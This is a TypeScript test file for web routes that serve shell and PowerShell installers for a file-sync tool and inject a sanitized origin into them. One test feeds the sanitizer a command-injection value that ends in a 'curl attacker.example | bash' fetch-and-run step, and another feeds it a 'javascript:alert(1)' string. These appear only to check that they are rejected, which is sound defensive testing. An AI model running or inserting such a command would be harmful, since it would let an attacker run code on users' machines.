import fastify from "fastify";
import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  helixSyncScriptDir,
  registerDriveSyncInstallRoutes,
  requestOrigin,
  sanitizeOrigin,
  withHelixOrigin,
} from "./sync-install-routes.js";

describe("Drive sync install routes", () => {
  it("injects the Helix origin into shell and PowerShell installers", () => {
    const sh = withHelixOrigin("#!/usr/bin/env bash\necho hi\n", "https://helix.example", "shell");
    expect(sh.startsWith("#!/usr/bin/env bash\n")).toBe(true);
    expect(sh).toContain('HELIX_SYNC_ORIGIN="${HELIX_SYNC_ORIGIN:-https://helix.example}"');
    const ps = withHelixOrigin("Write-Host hi\n", "https://helix.example", "powershell");
    expect(ps).toContain('$env:HELIX_SYNC_ORIGIN = "https://helix.example"');
  });

  it("refuses to inject a host that is not an http(s) origin", () => {
    expect(sanitizeOrigin('https://evil.example"; curl attacker.example | bash')).toBe(
      "http://localhost",
    );
    expect(withHelixOrigin("echo hi\n", "javascript:alert(1)", "shell")).toContain(
      "http://localhost",
    );
  });

  it("serves install.sh without auth and prefers forwarded host", async () => {
    const app = fastify();
    await registerDriveSyncInstallRoutes(app);
    const response = await app.inject({
      method: "GET",
      url: "/drive/sync/install.sh",
      headers: { "x-forwarded-host": "files.example.com", "x-forwarded-proto": "https" },
    });
    expect(response.statusCode).toBe(200);
    expect(response.body.startsWith("#!/usr/bin/env bash")).toBe(true);
    expect(response.body).toContain("https://files.example.com");
    expect(response.body).not.toContain("pnpm helix:drive-sync");
    expect(response.headers["content-disposition"]).toContain("install-helix-sync.sh");
    const onDisk = readFileSync(join(helixSyncScriptDir(), "install.sh"), "utf8");
    expect(onDisk).toContain("rclone");
    expect(existsSync(join(helixSyncScriptDir(), "install.ps1"))).toBe(true);
    expect(requestOrigin({ headers: { host: "localhost:3000" }, protocol: "http" } as never)).toBe(
      "http://localhost:3000",
    );
  });

  it("serves the PowerShell installer", async () => {
    const app = fastify();
    await registerDriveSyncInstallRoutes(app);
    const response = await app.inject({ method: "GET", url: "/drive/sync/install.ps1" });
    expect(response.statusCode).toBe(200);
    expect(response.body).toContain("Invoke-WebRequest");
    expect(response.body).not.toContain("pnpm helix:drive-sync");
    expect(response.headers["content-disposition"]).toContain("install-helix-sync.ps1");
  });
});
